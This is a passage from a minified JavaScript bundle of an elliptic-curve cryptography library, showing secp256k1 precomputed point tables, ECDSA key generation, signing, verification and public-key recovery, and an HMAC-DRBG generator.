                ["8ea9666139527a8c1dd94ce4f071fd23c8b350c5a4bb33748c4ba111faccae0", "620efabbc8ee2782e24e7c0cfb95c5d735b783be9cf0f8e955af34a30e62b945"],
                ["dd3625faef5ba06074669716bbd3788d89bdde815959968092f76cc4eb9a9787", "7a188fa3520e30d461da2501045731ca941461982883395937f68d00c644a573"],
                ["f710d79d9eb962297e4f6232b40e8f7feb2bc63814614d692c12de752408221e", "ea98e67232d3b3295d3b535532115ccac8612c721851617526ae47a9c77bfc82"]
            ] }, naf: { wnd: 7, points: [
                ["f9308a019258c31049344f85f89d5229b531c845836f99b08601f113bce036f9", "388f7b0f632de8140fe337e62a37f3566500a99934c2231b6cb9fd7584b8e672"],
                ["2f8bde4d1a07209355b4a7250a5c5128e88b84bddc619ab7cba8d569b240efe4", "d8ac222636e5e3d6d4dba9dda6c9c426f788271bab0d6840dca87d3aa6ac62d6"],
                ["5cbdf0646e5db4eaa398f365f2ea7a0e3d419b7e0330e39ce92bddedcac4f9bc", "6aebca40ba255960a3178d6d861a54dba813d0b813fde7b5a5082628087264da"],
                ["acd484e2f0c7f65309ad178a9f559abde09796974c57e714c35f110dfc27ccbe", "cc338921b0a7d9fd64380971763b61e9add888a4375f8e0f05cc262ac64f9c37"],
                ["774ae7f858a9411e5ef4246b70c65aac5649980be5c17891bbec17895da008cb", "d984a032eb6b5e190243dd56d7b7b365372db1e2dff9d6a8301d74c9c953c61b"],
                ["f28773c2d975288bc7d1d205c3748651b075fbc6610e58cddeeddf8f19405aa8", "ab0902e8d880a89758212eb65cdaf473a1a06da521fa91f29b5cb52db03ed81"],
                ["d7924d4f7d43ea965a465ae3095ff41131e5946f3c85f79e44adbcf8e27e080e", "581e2872a86c72a683842ec228cc6defea40af2bd896d3a5c504dc9ff6a26b58"],
                ["defdea4cdb677750a420fee807eacf21eb9898ae79b9768766e4faa04a2d4a34", "4211ab0694635168e997b0ead2a93daeced1f4a04a95c0f6cfb199f69e56eb77"],
                ["2b4ea0a797a443d293ef5cff444f4979f06acfebd7e86d277475656138385b6c", "85e89bc037945d93b343083b5a1c86131a01f60c50269763b570c854e5c09b7a"],
                ["352bbf4a4cdd12564f93fa332ce333301d9ad40271f8107181340aef25be59d5", "321eb4075348f534d59c18259dda3e1f4a1b3b2e71b1039c67bd3d8bcf81998c"],
                ["2fa2104d6b38d11b0230010559879124e42ab8dfeff5ff29dc9cdadd4ecacc3f", "2de1068295dd865b64569335bd5dd80181d70ecfc882648423ba76b532b7d67"],
                ["9248279b09b4d68dab21a9b066edda83263c3d84e09572e269ca0cd7f5453714", "73016f7bf234aade5d1aa71bdea2b1ff3fc0de2a887912ffe54a32ce97cb3402"],
                ["daed4f2be3a8bf278e70132fb0beb7522f570e144bf615c07e996d443dee8729", "a69dce4a7d6c98e8d4a1aca87ef8d7003f83c230f3afa726ab40e52290be1c55"],
                ["c44d12c7065d812e8acf28d7cbb19f9011ecd9e9fdf281b0e6a3b5e87d22e7db", "2119a460ce326cdc76c45926c982fdac0e106e861edf61c5a039063f0e0e6482"],
                ["6a245bf6dc698504c89a20cfded60853152b695336c28063b61c65cbd269e6b4", "e022cf42c2bd4a708b3f5126f16a24ad8b33ba48d0423b6efd5e6348100d8a82"],
                ["1697ffa6fd9de627c077e3d2fe541084ce13300b0bec1146f95ae57f0d0bd6a5", "b9c398f186806f5d27561506e4557433a2cf15009e498ae7adee9d63d01b2396"],
                ["605bdb019981718b986d0f07e834cb0d9deb8360ffb7f61df982345ef27a7479", "2972d2de4f8d20681a78d93ec96fe23c26bfae84fb14db43b01e1e9056b8c49"],
                ["62d14dab4150bf497402fdc45a215e10dcb01c354959b10cfe31c7e9d87ff33d", "80fc06bd8cc5b01098088a1950eed0db01aa132967ab472235f5642483b25eaf"],
                ["80c60ad0040f27dade5b4b06c408e56b2c50e9f56b9b8b425e555c2f86308b6f", "1c38303f1cc5c30f26e66bad7fe72f70a65eed4cbe7024eb1aa01f56430bd57a"],
                ["7a9375ad6167ad54aa74c6348cc54d344cc5dc9487d847049d5eabb0fa03c8fb", "d0e3fa9eca8726909559e0d79269046bdc59ea10c70ce2b02d499ec224dc7f7"],
                ["d528ecd9b696b54c907a9ed045447a79bb408ec39b68df504bb51f459bc3ffc9", "eecf41253136e5f99966f21881fd656ebc4345405c520dbc063465b521409933"],
                ["49370a4b5f43412ea25f514e8ecdad05266115e4a7ecb1387231808f8b45963", "758f3f41afd6ed428b3081b0512fd62a54c3f3afbb5b6764b653052a12949c9a"],
                ["77f230936ee88cbbd73df930d64702ef881d811e0e1498e2f1c13eb1fc345d74", "958ef42a7886b6400a08266e9ba1b37896c95330d97077cbbe8eb3c7671c60d6"],
                ["f2dac991cc4ce4b9ea44887e5c7c0bce58c80074ab9d4dbaeb28531b7739f530", "e0dedc9b3b2f8dad4da1f32dec2531df9eb5fbeb0598e4fd1a117dba703a3c37"],
                ["463b3d9f662621fb1b4be8fbbe2520125a216cdfc9dae3debcba4850c690d45b", "5ed430d78c296c3543114306dd8622d7c622e27c970a1de31cb377b01af7307e"],
                ["f16f804244e46e2a09232d4aff3b59976b98fac14328a2d1a32496b49998f247", "cedabd9b82203f7e13d206fcdf4e33d92a6c53c26e5cce26d6579962c4e31df6"],
                ["caf754272dc84563b0352b7a14311af55d245315ace27c65369e15f7151d41d1", "cb474660ef35f5f2a41b643fa5e460575f4fa9b7962232a5c32f908318a04476"],
                ["2600ca4b282cb986f85d0f1709979d8b44a09c07cb86d7c124497bc86f082120", "4119b88753c15bd6a693b03fcddbb45d5ac6be74ab5f0ef44b0be9475a7e4b40"],
                ["7635ca72d7e8432c338ec53cd12220bc01c48685e24f7dc8c602a7746998e435", "91b649609489d613d1d5e590f78e6d74ecfc061d57048bad9e76f302c5b9c61"],
                ["754e3239f325570cdbbf4a87deee8a66b7f2b33479d468fbc1a50743bf56cc18", "673fb86e5bda30fb3cd0ed304ea49a023ee33d0197a695d0c5d98093c536683"],
                ["e3e6bd1071a1e96aff57859c82d570f0330800661d1c952f9fe2694691d9b9e8", "59c9e0bba394e76f40c0aa58379a3cb6a5a2283993e90c4167002af4920e37f5"],
                ["186b483d056a033826ae73d88f732985c4ccb1f32ba35f4b4cc47fdcf04aa6eb", "3b952d32c67cf77e2e17446e204180ab21fb8090895138b4a4a797f86e80888b"],
                ["df9d70a6b9876ce544c98561f4be4f725442e6d2b737d9c91a8321724ce0963f", "55eb2dafd84d6ccd5f862b785dc39d4ab157222720ef9da217b8c45cf2ba2417"],
                ["5edd5cc23c51e87a497ca815d5dce0f8ab52554f849ed8995de64c5f34ce7143", "efae9c8dbc14130661e8cec030c89ad0c13c66c0d17a2905cdc706ab7399a868"],
                ["290798c2b6476830da12fe02287e9e777aa3fba1c355b17a722d362f84614fba", "e38da76dcd440621988d00bcf79af25d5b29c094db2a23146d003afd41943e7a"],
                ["af3c423a95d9f5b3054754efa150ac39cd29552fe360257362dfdecef4053b45", "f98a3fd831eb2b749a93b0e6f35cfb40c8cd5aa667a15581bc2feded498fd9c6"],
                ["766dbb24d134e745cccaa28c99bf274906bb66b26dcf98df8d2fed50d884249a", "744b1152eacbe5e38dcc887980da38b897584a65fa06cedd2c924f97cbac5996"],
                ["59dbf46f8c94759ba21277c33784f41645f7b44f6c596a58ce92e666191abe3e", "c534ad44175fbc300f4ea6ce648309a042ce739a7919798cd85e216c4a307f6e"],
                ["f13ada95103c4537305e691e74e9a4a8dd647e711a95e73cb62dc6018cfd87b8", "e13817b44ee14de663bf4bc808341f326949e21a6a75c2570778419bdaf5733d"],
                ["7754b4fa0e8aced06d4167a2c59cca4cda1869c06ebadfb6488550015a88522c", "30e93e864e669d82224b967c3020b8fa8d1e4e350b6cbcc537a48b57841163a2"],
                ["948dcadf5990e048aa3874d46abef9d701858f95de8041d2a6828c99e2262519", "e491a42537f6e597d5d28a3224b1bc25df9154efbd2ef1d2cbba2cae5347d57e"],
                ["7962414450c76c1689c7b48f8202ec37fb224cf5ac0bfa1570328a8a3d7c77ab", "100b610ec4ffb4760d5c1fc133ef6f6b12507a051f04ac5760afa5b29db83437"],
                ["3514087834964b54b15b160644d915485a16977225b8847bb0dd085137ec47ca", "ef0afbb2056205448e1652c48e8127fc6039e77c15c2378b7e7d15a0de293311"],
                ["d3cc30ad6b483e4bc79ce2c9dd8bc54993e947eb8df787b442943d3f7b527eaf", "8b378a22d827278d89c5e9be8f9508ae3c2ad46290358630afb34db04eede0a4"],
                ["1624d84780732860ce1c78fcbfefe08b2b29823db913f6493975ba0ff4847610", "68651cf9b6da903e0914448c6cd9d4ca896878f5282be4c8cc06e2a404078575"],
                ["733ce80da955a8a26902c95633e62a985192474b5af207da6df7b4fd5fc61cd4", "f5435a2bd2badf7d485a4d8b8db9fcce3e1ef8e0201e4578c54673bc1dc5ea1d"],
                ["15d9441254945064cf1a1c33bbd3b49f8966c5092171e699ef258dfab81c045c", "d56eb30b69463e7234f5137b73b84177434800bacebfc685fc37bbe9efe4070d"],
                ["a1d0fcf2ec9de675b612136e5ce70d271c21417c9d2b8aaaac138599d0717940", "edd77f50bcb5a3cab2e90737309667f2641462a54070f3d519212d39c197a629"],
                ["e22fbe15c0af8ccc5780c0735f84dbe9a790badee8245c06c7ca37331cb36980", "a855babad5cd60c88b430a69f53a1a7a38289154964799be43d06d77d31da06"],
                ["311091dd9860e8e20ee13473c1155f5f69635e394704eaa74009452246cfa9b3", "66db656f87d1f04fffd1f04788c06830871ec5a64feee685bd80f0b1286d8374"],
                ["34c1fd04d301be89b31c0442d3e6ac24883928b45a9340781867d4232ec2dbdf", "9414685e97b1b5954bd46f730174136d57f1ceeb487443dc5321857ba73abee"],
                ["f219ea5d6b54701c1c14de5b557eb42a8d13f3abbcd08affcc2a5e6b049b8d63", "4cb95957e83d40b0f73af4544cccf6b1f4b08d3c07b27fb8d8c2962a400766d1"],
                ["d7b8740f74a8fbaab1f683db8f45de26543a5490bca627087236912469a0b448", "fa77968128d9c92ee1010f337ad4717eff15db5ed3c049b3411e0315eaa4593b"],
                ["32d31c222f8f6f0ef86f7c98d3a3335ead5bcd32abdd94289fe4d3091aa824bf", "5f3032f5892156e39ccd3d7915b9e1da2e6dac9e6f26e961118d14b8462e1661"],
                ["7461f371914ab32671045a155d9831ea8793d77cd59592c4340f86cbc18347b5", "8ec0ba238b96bec0cbdddcae0aa442542eee1ff50c986ea6b39847b3cc092ff6"],
                ["ee079adb1df1860074356a25aa38206a6d716b2c3e67453d287698bad7b2b2d6", "8dc2412aafe3be5c4c5f37e0ecc5f9f6a446989af04c4e25ebaac479ec1c8c1e"],
                ["16ec93e447ec83f0467b18302ee620f7e65de331874c9dc72bfd8616ba9da6b5", "5e4631150e62fb40d0e8c2a7ca5804a39d58186a50e497139626778e25b0674d"],
                ["eaa5f980c245f6f038978290afa70b6bd8855897f98b6aa485b96065d537bd99", "f65f5d3e292c2e0819a528391c994624d784869d7e6ea67fb18041024edc07dc"],
                ["78c9407544ac132692ee1910a02439958ae04877151342ea96c4b6b35a49f51", "f3e0319169eb9b85d5404795539a5e68fa1fbd583c064d2462b675f194a3ddb4"],
                ["494f4be219a1a77016dcd838431aea0001cdc8ae7a6fc688726578d9702857a5", "42242a969283a5f339ba7f075e36ba2af925ce30d767ed6e55f4b031880d562c"],
                ["a598a8030da6d86c6bc7f2f5144ea549d28211ea58faa70ebf4c1e665c1fe9b5", "204b5d6f84822c307e4b4a7140737aec23fc63b65b35f86a10026dbd2d864e6b"],
                ["c41916365abb2b5d09192f5f2dbeafec208f020f12570a184dbadc3e58595997", "4f14351d0087efa49d245b328984989d5caf9450f34bfc0ed16e96b58fa9913"],
                ["841d6063a586fa475a724604da03bc5b92a2e0d2e0a36acfe4c73a5514742881", "73867f59c0659e81904f9a1c7543698e62562d6744c169ce7a36de01a8d6154"],
                ["5e95bb399a6971d376026947f89bde2f282b33810928be4ded112ac4d70e20d5", "39f23f366809085beebfc71181313775a99c9aed7d8ba38b161384c746012865"],
                ["36e4641a53948fd476c39f8a99fd974e5ec07564b5315d8bf99471bca0ef2f66", "d2424b1b1abe4eb8164227b085c9aa9456ea13493fd563e06fd51cf5694c78fc"],
                ["336581ea7bfbbb290c191a2f507a41cf5643842170e914faeab27c2c579f726", "ead12168595fe1be99252129b6e56b3391f7ab1410cd1e0ef3dcdcabd2fda224"],
                ["8ab89816dadfd6b6a1f2634fcf00ec8403781025ed6890c4849742706bd43ede", "6fdcef09f2f6d0a044e654aef624136f503d459c3e89845858a47a9129cdd24e"],
                ["1e33f1a746c9c5778133344d9299fcaa20b0938e8acff2544bb40284b8c5fb94", "60660257dd11b3aa9c8ed618d24edff2306d320f1d03010e33a7d2057f3b3b6"],
                ["85b7c1dcb3cec1b7ee7f30ded79dd20a0ed1f4cc18cbcfcfa410361fd8f08f31", "3d98a9cdd026dd43f39048f25a8847f4fcafad1895d7a633c6fed3c35e999511"],
                ["29df9fbd8d9e46509275f4b125d6d45d7fbe9a3b878a7af872a2800661ac5f51", "b4c4fe99c775a606e2d8862179139ffda61dc861c019e55cd2876eb2a27d84b"],
                ["a0b1cae06b0a847a3fea6e671aaf8adfdfe58ca2f768105c8082b2e449fce252", "ae434102edde0958ec4b19d917a6a28e6b72da1834aff0e650f049503a296cf2"],
                ["4e8ceafb9b3e9a136dc7ff67e840295b499dfb3b2133e4ba113f2e4c0e121e5", "cf2174118c8b6d7a4b48f6d534ce5c79422c086a63460502b827ce62a326683c"],
                ["d24a44e047e19b6f5afb81c7ca2f69080a5076689a010919f42725c2b789a33b", "6fb8d5591b466f8fc63db50f1c0f1c69013f996887b8244d2cdec417afea8fa3"],
                ["ea01606a7a6c9cdd249fdfcfacb99584001edd28abbab77b5104e98e8e3b35d4", "322af4908c7312b0cfbfe369f7a7b3cdb7d4494bc2823700cfd652188a3ea98d"],
                ["af8addbf2b661c8a6c6328655eb96651252007d8c5ea31be4ad196de8ce2131f", "6749e67c029b85f52a034eafd096836b2520818680e26ac8f3dfbcdb71749700"],
                ["e3ae1974566ca06cc516d47e0fb165a674a3dabcfca15e722f0e3450f45889", "2aeabe7e4531510116217f07bf4d07300de97e4874f81f533420a72eeb0bd6a4"],
                ["591ee355313d99721cf6993ffed1e3e301993ff3ed258802075ea8ced397e246", "b0ea558a113c30bea60fc4775460c7901ff0b053d25ca2bdeee98f1a4be5d196"],
                ["11396d55fda54c49f19aa97318d8da61fa8584e47b084945077cf03255b52984", "998c74a8cd45ac01289d5833a7beb4744ff536b01b257be4c5767bea93ea57a4"],
                ["3c5d2a1ba39c5a1790000738c9e0c40b8dcdfd5468754b6405540157e017aa7a", "b2284279995a34e2f9d4de7396fc18b80f9b8b9fdd270f6661f79ca4c81bd257"],
                ["cc8704b8a60a0defa3a99a7299f2e9c3fbc395afb04ac078425ef8a1793cc030", "bdd46039feed17881d1e0862db347f8cf395b74fc4bcdc4e940b74e3ac1f1b13"],
                ["c533e4f7ea8555aacd9777ac5cad29b97dd4defccc53ee7ea204119b2889b197", "6f0a256bc5efdf429a2fb6242f1a43a2d9b925bb4a4b3a26bb8e0f45eb596096"],
                ["c14f8f2ccb27d6f109f6d08d03cc96a69ba8c34eec07bbcf566d48e33da6593", "c359d6923bb398f7fd4473e16fe1c28475b740dd098075e6c0e8649113dc3a38"],
                ["a6cbc3046bc6a450bac24789fa17115a4c9739ed75f8f21ce441f72e0b90e6ef", "21ae7f4680e889bb130619e2c0f95a360ceb573c70603139862afd617fa9b9f"],
                ["347d6d9a02c48927ebfb86c1359b1caf130a3c0267d11ce6344b39f99d43cc38", "60ea7f61a353524d1c987f6ecec92f086d565ab687870cb12689ff1e31c74448"],
                ["da6545d2181db8d983f7dcb375ef5866d47c67b1bf31c8cf855ef7437b72656a", "49b96715ab6878a79e78f07ce5680c5d6673051b4935bd897fea824b77dc208a"],
                ["c40747cc9d012cb1a13b8148309c6de7ec25d6945d657146b9d5994b8feb1111", "5ca560753be2a12fc6de6caf2cb489565db936156b9514e1bb5e83037e0fa2d4"],
                ["4e42c8ec82c99798ccf3a610be870e78338c7f713348bd34c8203ef4037f3502", "7571d74ee5e0fb92a7a8b33a07783341a5492144cc54bcc40a94473693606437"],
                ["3775ab7089bc6af823aba2e1af70b236d251cadb0c86743287522a1b3b0dedea", "be52d107bcfa09d8bcb9736a828cfa7fac8db17bf7a76a2c42ad961409018cf7"],
                ["cee31cbf7e34ec379d94fb814d3d775ad954595d1314ba8846959e3e82f74e26", "8fd64a14c06b589c26b947ae2bcf6bfa0149ef0be14ed4d80f448a01c43b1c6d"],
                ["b4f9eaea09b6917619f6ea6a4eb5464efddb58fd45b1ebefcdc1a01d08b47986", "39e5c9925b5a54b07433a4f18c61726f8bb131c012ca542eb24a8ac07200682a"],
                ["d4263dfc3d2df923a0179a48966d30ce84e2515afc3dccc1b77907792ebcc60e", "62dfaf07a0f78feb30e30d6295853ce189e127760ad6cf7fae164e122a208d54"],
                ["48457524820fa65a4f8d35eb6930857c0032acc0a4a2de422233eeda897612c4", "25a748ab367979d98733c38a1fa1c2e7dc6cc07db2d60a9ae7a76aaa49bd0f77"],
                ["dfeeef1881101f2cb11644f3a2afdfc2045e19919152923f367a1767c11cceda", "ecfb7056cf1de042f9420bab396793c0c390bde74b4bbdff16a83ae09a9a7517"],
                ["6d7ef6b17543f8373c573f44e1f389835d89bcbc6062ced36c82df83b8fae859", "cd450ec335438986dfefa10c57fea9bcc521a0959b2d80bbf74b190dca712d10"],
                ["e75605d59102a5a2684500d3b991f2e3f3c88b93225547035af25af66e04541f", "f5c54754a8f71ee540b9b48728473e314f729ac5308b06938360990e2bfad125"],
                ["eb98660f4c4dfaa06a2be453d5020bc99a0c2e60abe388457dd43fefb1ed620c", "6cb9a8876d9cb8520609af3add26cd20a0a7cd8a9411131ce85f44100099223e"],
                ["13e87b027d8514d35939f2e6892b19922154596941888336dc3563e3b8dba942", "fef5a3c68059a6dec5d624114bf1e91aac2b9da568d6abeb2570d55646b8adf1"],
                ["ee163026e9fd6fe017c38f06a5be6fc125424b371ce2708e7bf4491691e5764a", "1acb250f255dd61c43d94ccc670d0f58f49ae3fa15b96623e5430da0ad6c62b2"],
                ["b268f5ef9ad51e4d78de3a750c2dc89b1e626d43505867999932e5db33af3d80", "5f310d4b3c99b9ebb19f77d41c1dee018cf0d34fd4191614003e945a1216e423"],
                ["ff07f3118a9df035e9fad85eb6c7bfe42b02f01ca99ceea3bf7ffdba93c4750d", "438136d603e858a3a5c440c38eccbaddc1d2942114e2eddd4740d098ced1f0d8"],
                ["8d8b9855c7c052a34146fd20ffb658bea4b9f69e0d825ebec16e8c3ce2b526a1", "cdb559eedc2d79f926baf44fb84ea4d44bcf50fee51d7ceb30e2e7f463036758"],
                ["52db0b5384dfbf05bfa9d472d7ae26dfe4b851ceca91b1eba54263180da32b63", "c3b997d050ee5d423ebaf66a6db9f57b3180c902875679de924b69d84a7b375"],
                ["e62f9490d3d51da6395efd24e80919cc7d0f29c3f3fa48c6fff543becbd43352", "6d89ad7ba4876b0b22c2ca280c682862f342c8591f1daf5170e07bfd9ccafa7d"],
                ["7f30ea2476b399b4957509c88f77d0191afa2ff5cb7b14fd6d8e7d65aaab1193", "ca5ef7d4b231c94c3b15389a5f6311e9daff7bb67b103e9880ef4bff637acaec"],
                ["5098ff1e1d9f14fb46a210fada6c903fef0fb7b4a1dd1d9ac60a0361800b7a00", "9731141d81fc8f8084d37c6e7542006b3ee1b40d60dfe5362a5b132fd17ddc0"],
                ["32b78c7de9ee512a72895be6b9cbefa6e2f3c4ccce445c96b9f2c81e2778ad58", "ee1849f513df71e32efc3896ee28260c73bb80547ae2275ba497237794c8753c"],
                ["e2cb74fddc8e9fbcd076eef2a7c72b0ce37d50f08269dfc074b581550547a4f7", "d3aa2ed71c9dd2247a62df062736eb0baddea9e36122d2be8641abcb005cc4a4"],
                ["8438447566d4d7bedadc299496ab357426009a35f235cb141be0d99cd10ae3a8", "c4e1020916980a4da5d01ac5e6ad330734ef0d7906631c4f2390426b2edd791f"],
                ["4162d488b89402039b584c6fc6c308870587d9c46f660b878ab65c82c711d67e", "67163e903236289f776f22c25fb8a3afc1732f2b84b4e95dbda47ae5a0852649"],
                ["3fad3fa84caf0f34f0f89bfd2dcf54fc175d767aec3e50684f3ba4a4bf5f683d", "cd1bc7cb6cc407bb2f0ca647c718a730cf71872e7d0d2a53fa20efcdfe61826"],
                ["674f2600a3007a00568c1a7ce05d0816c1fb84bf1370798f1c69532faeb1a86b", "299d21f9413f33b3edf43b257004580b70db57da0b182259e09eecc69e0d38a5"],
                ["d32f4da54ade74abb81b815ad1fb3b263d82d6c692714bcff87d29bd5ee9f08f", "f9429e738b8e53b968e99016c059707782e14f4535359d582fc416910b3eea87"],
                ["30e4e670435385556e593657135845d36fbb6931f72b08cb1ed954f1e3ce3ff6", "462f9bce619898638499350113bbc9b10a878d35da70740dc695a559eb88db7b"],
                ["be2062003c51cc3004682904330e4dee7f3dcd10b01e580bf1971b04d4cad297", "62188bc49d61e5428573d48a74e1c655b1c61090905682a0d5558ed72dccb9bc"],
                ["93144423ace3451ed29e0fb9ac2af211cb6e84a601df5993c419859fff5df04a", "7c10dfb164c3425f5c71a3f9d7992038f1065224f72bb9d1d902a6d13037b47c"],
                ["b015f8044f5fcbdcf21ca26d6c34fb8197829205c7b7d2a7cb66418c157b112c", "ab8c1e086d04e813744a655b2df8d5f83b3cdc6faa3088c1d3aea1454e3a1d5f"],
                ["d5e9e1da649d97d89e4868117a465a3a4f8a18de57a140d36b3f2af341a21b52", "4cb04437f391ed73111a13cc1d4dd0db1693465c2240480d8955e8592f27447a"],
                ["d3ae41047dd7ca065dbf8ed77b992439983005cd72e16d6f996a5316d36966bb", "bd1aeb21ad22ebb22a10f0303417c6d964f8cdd7df0aca614b10dc14d125ac46"],
                ["463e2763d885f958fc66cdd22800f0a487197d0a82e377b49f80af87c897b065", "bfefacdb0e5d0fd7df3a311a94de062b26b80c61fbc97508b79992671ef7ca7f"],
                ["7985fdfd127c0567c6f53ec1bb63ec3158e597c40bfe747c83cddfc910641917", "603c12daf3d9862ef2b25fe1de289aed24ed291e0ec6708703a5bd567f32ed03"],
                ["74a1ad6b5f76e39db2dd249410eac7f99e74c59cb83d2d0ed5ff1543da7703e9", "cc6157ef18c9c63cd6193d83631bbea0093e0968942e8c33d5737fd790e0db08"],
                ["30682a50703375f602d416664ba19b7fc9bab42c72747463a71d0896b22f6da3", "553e04f6b018b4fa6c8f39e7f311d3176290d0e0f19ca73f17714d9977a22ff8"],
                ["9e2158f0d7c0d5f26c3791efefa79597654e7a2b2464f52b1ee6c1347769ef57", "712fcdd1b9053f09003a3481fa7762e9ffd7c8ef35a38509e2fbf2629008373"],
                ["176e26989a43c9cfeba4029c202538c28172e566e3c4fce7322857f3be327d66", "ed8cc9d04b29eb877d270b4878dc43c19aefd31f4eee09ee7b47834c1fa4b1c3"],
                ["75d46efea3771e6e68abb89a13ad747ecf1892393dfc4f1b7004788c50374da8", "9852390a99507679fd0b86fd2b39a868d7efc22151346e1a3ca4726586a6bed8"],
                ["809a20c67d64900ffb698c4c825f6d5f2310fb0451c869345b7319f645605721", "9e994980d9917e22b76b061927fa04143d096ccc54963e6a5ebfa5f3f8e286c1"],
                ["1b38903a43f7f114ed4500b4eac7083fdefece1cf29c63528d563446f972c180", "4036edc931a60ae889353f77fd53de4a2708b26b6f5da72ad3394119daf408f9"]
            ] } } }, function(e, t, n) { "use strict";

    function i(e) { if (!(this instanceof i)) return new i(e); "string" == typeof e && (c(a.curves.hasOwnProperty(e), "Unknown curve " + e), e = a.curves[e]), e instanceof a.curves.PresetCurve && (e = { curve: e }), this.curve = e.curve.curve, this.n = this.curve.n, this.nh = this.n.ushrn(1), this.g = this.curve.g, this.g = e.curve.g, this.g.precompute(e.curve.n.bitLength() + 1), this.hash = e.hash || e.curve.hash } var r = n(3),
        o = n(136),
        a = n(4),
        s = a.utils,
        c = s.assert,
        u = n(137),
        l = n(138);
    e.exports = i, i.prototype.keyPair = function(e) { return new u(this, e) }, i.prototype.keyFromPrivate = function(e, t) { return u.fromPrivate(this, e, t) }, i.prototype.keyFromPublic = function(e, t) { return u.fromPublic(this, e, t) }, i.prototype.genKeyPair = function(e) { e || (e = {}); for (var t = new o({ hash: this.hash, pers: e.pers, persEnc: e.persEnc || "utf8", entropy: e.entropy || a.rand(this.hash.hmacStrength), entropyEnc: e.entropy && e.entropyEnc || "utf8", nonce: this.n.toArray() }), n = this.n.byteLength(), i = this.n.sub(new r(2));;) { var s = new r(t.generate(n)); if (!(s.cmp(i) > 0)) return s.iaddn(1), this.keyFromPrivate(s) } }, i.prototype._truncateToN = function(e, t) { var n = 8 * e.byteLength() - this.n.bitLength(); return n > 0 && (e = e.ushrn(n)), !t && e.cmp(this.n) >= 0 ? e.sub(this.n) : e }, i.prototype.sign = function(e, t, n, i) { "object" == typeof n && (i = n, n = null), i || (i = {}), t = this.keyFromPrivate(t, n), e = this._truncateToN(new r(e, 16)); for (var a = this.n.byteLength(), s = t.getPrivate().toArray("be", a), c = e.toArray("be", a), u = new o({ hash: this.hash, entropy: s, nonce: c, pers: i.pers, persEnc: i.persEnc || "utf8" }), d = this.n.sub(new r(1)), f = 0; !0; f++) { var h = i.k ? i.k(f) : new r(u.generate(this.n.byteLength())); if (h = this._truncateToN(h, !0), !(h.cmpn(1) <= 0 || h.cmp(d) >= 0)) { var p = this.g.mul(h); if (!p.isInfinity()) { var b = p.getX(),
                        m = b.umod(this.n); if (0 !== m.cmpn(0)) { var g = h.invm(this.n).mul(m.mul(t.getPrivate()).iadd(e)); if (g = g.umod(this.n), 0 !== g.cmpn(0)) { var v = (p.getY().isOdd() ? 1 : 0) | (0 !== b.cmp(m) ? 2 : 0); return i.canonical && g.cmp(this.nh) > 0 && (g = this.n.sub(g), v ^= 1), new l({ r: m, s: g, recoveryParam: v }) } } } } } }, i.prototype.verify = function(e, t, n, i) { e = this._truncateToN(new r(e, 16)), n = this.keyFromPublic(n, i), t = new l(t, "hex"); var o = t.r,
            a = t.s; if (o.cmpn(1) < 0 || o.cmp(this.n) >= 0) return !1; if (a.cmpn(1) < 0 || a.cmp(this.n) >= 0) return !1; var s = a.invm(this.n),
            c = s.mul(e).umod(this.n),
            u = s.mul(o).umod(this.n); if (!this.curve._maxwellTrick) { var d = this.g.mulAdd(c, n.getPublic(), u); return !d.isInfinity() && 0 === d.getX().umod(this.n).cmp(o) } var d = this.g.jmulAdd(c, n.getPublic(), u); return !d.isInfinity() && d.eqXToP(o) }, i.prototype.recoverPubKey = function(e, t, n, i) { c((3 & n) === n, "The recovery param is more than two bits"), t = new l(t, i); var o = this.n,
            a = new r(e),
            s = t.r,
            u = t.s,
            d = 1 & n,
            f = n >> 1; if (s.cmp(this.curve.p.umod(this.curve.n)) >= 0 && f) throw new Error("Unable to find sencond key candinate");
        s = f ? this.curve.pointFromX(s.add(this.curve.n), d) : this.curve.pointFromX(s, d); var h = t.r.invm(o),
            p = o.sub(a).mul(h).umod(o),
            b = u.mul(h).umod(o); return this.g.mulAdd(p, s, b) }, i.prototype.getKeyRecoveryParam = function(e, t, n, i) { if (t = new l(t, i), null !== t.recoveryParam) return t.recoveryParam; for (var r = 0; r < 4; r++) { var o; try { o = this.recoverPubKey(e, t, r) } catch (e) { continue } if (o.eq(n)) return r } throw new Error("Unable to find valid recovery factor") } }, function(e, t, n) { "use strict";

    function i(e) { if (!(this instanceof i)) return new i(e);
        this.hash = e.hash, this.predResist = !!e.predResist, this.outLen = this.hash.outSize, this.minEntropy = e.minEntropy || this.hash.hmacStrength, this._reseed = null, this.reseedInterval = null, this.K = null, this.V = null; var t = o.toArray(e.entropy, e.entropyEnc || "hex"),
            n = o.toArray(e.nonce, e.nonceEnc || "hex"),
            r = o.toArray(e.pers, e.persEnc || "hex");
        a(t.length >= this.minEntropy / 8, "Not enough entropy. Minimum is: " + this.minEntropy + " bits"), this._init(t, n, r) } var r = n(36),
        o = n(58),
        a = n(5);
    e.exports = i, i.prototype._init = function(e, t, n) { var i = e.concat(t).concat(n);
        this.K = new Array(this.outLen / 8), this.V = new Array(this.outLen / 8); for (var r = 0; r < this.V.length; r++) this.K[r] = 0, this.V[r] = 1;
        this._update(i), this._reseed = 1, this.reseedInterval = 281474976710656 }, i.prototype._hmac = function() { return new r.hmac(this.hash, this.K) }, i.prototype._update = function(e) { var t = this._hmac().update(this.V).update([0]);
        e && (t = t.update(e)), this.K = t.digest(), this.V = this._hmac().update(this.V).digest(), e && (this.K = this._hmac().update(this.V).update([1]).update(e).digest(), this.V = this._hmac().update(this.V).digest()) }, i.prototype.reseed = function(e, t, n, i) { "string" != typeof t && (i = n, n = t, t = null), e = o.toArray(e, t), n = o.toArray(n, i), a(e.length >= this.minEntropy / 8, "Not enough entropy. Minimum is: " + this.minEntropy + " bits"), this._update(e.concat(n || [])), this._reseed = 1 }, i.prototype.generate = function(e, t, n, i) { if (this._reseed > this.reseedInterval) throw new Error("Reseed is required"); "string" != typeof t && (i = n, n = t, t = null), n && (n = o.toArray(n, i || "hex"), this._update(n)); for (var r = []; r.length < e;) this.V = this._hmac().update(this.V).digest(), r = r.concat(this.V); var a = r.slice(0, e); return this._update(n), this._reseed++, o.encode(a, t) } }, function(e, t, n) { "use strict";

    function i(e, t) { this.ec = e, this.priv = null, this.pub = null, t.priv && this._importPrivate(t.priv, t.privEnc), t.pub && this._importPublic(t.pub, t.pubEnc) } var r = n(3),
        o = n(4),
        a = o.utils,
        s = a.assert;
